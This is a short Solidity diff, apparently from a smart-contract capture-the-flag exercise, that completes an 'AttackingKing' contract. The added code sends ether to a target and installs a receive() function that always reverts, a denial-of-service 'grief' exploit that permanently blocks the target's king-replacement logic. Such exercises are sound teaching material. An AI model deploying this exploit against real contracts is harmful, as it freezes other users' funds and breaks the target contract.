@@ -11,6 +11,11 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success, ) = contractAddress.call{value: 5 ether}("");
+        require(success, "low-level call failed");
+    }
+
+    receive() external payable {
+        revert("grief hack");
     }
 }
